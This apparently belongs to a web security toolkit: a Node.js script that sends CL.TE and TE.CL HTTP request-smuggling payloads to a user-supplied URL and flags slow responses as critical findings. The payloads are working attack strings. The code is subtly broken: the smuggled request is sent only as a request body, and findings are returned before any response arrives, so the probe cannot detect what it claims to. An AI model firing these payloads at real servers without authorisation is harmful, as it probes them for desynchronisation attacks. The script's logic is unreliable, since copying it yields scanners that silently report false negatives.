#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: request-smuggling-probe.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const http = require('http');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('vuln-probes/request-smuggling-probe');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;

  if (!url) {
    console.log(`Usage: node ${definition.filePath} --url <target-url>`);
    return;
  }

  const parsedUrl = new URL(url);
  console.log(`[*] Testing Request Smuggling on ${parsedUrl.hostname}:${parsedUrl.port || 80}...`);
  const findings = [];

  // CL.TE Payload (Content-Length / Transfer-Encoding)
  // Smuggle a 0-length chunk inside a larger request
  const clteRequest = 
    `POST ${parsedUrl.pathname} HTTP/1.1\r\n` +
    `Host: ${parsedUrl.hostname}\r\n` +
    `Content-Length: 4\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `Connection: keep-alive\r\n\r\n` +
    `0\r\n\r\n` +
    `G`;

  // TE.CL Payload (Transfer-Encoding / Content-Length)
  const teclRequest =
    `POST ${parsedUrl.pathname} HTTP/1.1\r\n` +
    `Host: ${parsedUrl.hostname}\r\n` +
    `Content-Length: 3\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `Connection: keep-alive\r\n\r\n` +
    `8\r\n` +
    `SMUGGLED\r\n` +
    `0\r\n\r\n`;

  const testPayloads = [
    { name: 'CL.TE', payload: clteRequest },
    { name: 'TE.CL', payload: teclRequest }
  ];

  for (const p of testPayloads) {
    try {
      console.log(`[*] Testing ${p.name} attack...`);
      const startTime = Date.now();
      const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || 80,
        path: parsedUrl.pathname,
        method: 'POST',
        headers: {
          'Content-Length': p.payload.length, // This is for the outer socket, not the inner smuggling!
        },
        timeout: 10000
      };

      const req = http.request(options, (res) => {
        const duration = Date.now() - startTime;
        if (duration >= 5000) {
          findings.push({
            title: `Potential Request Smuggling (${p.name})`,
            severity: 'Critical',
            target: url,
            tool: definition.id,
            cvss: '9.0',
            evidence: {
              request: p.payload,
              response: `Server timed out after ${duration}ms (Potential sync issue).`
            },
            remediation: 'Use HTTP/2 entirely or ensure the back-end and front-end (proxy) are using the same HTTP/1.1 library/implementation. Disable Transfer-Encoding in the proxy if possible.'
          });
          console.log(`[!] POSSIBLE REQUEST SMUGGLING: ${url} (${p.name})`);
        }
      });

      req.on('error', (e) => {
        // Skip
      });

      req.write(p.payload);
      req.end();
    } catch (err) {
      // Skip
    }
  }

  if (findings.length > 0) {
    console.log(`[+] Found ${findings.length} smuggling issues!`);
  } else {
    console.log('[-] No request smuggling detected via basic timeouts.');
  }

  return findings;
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
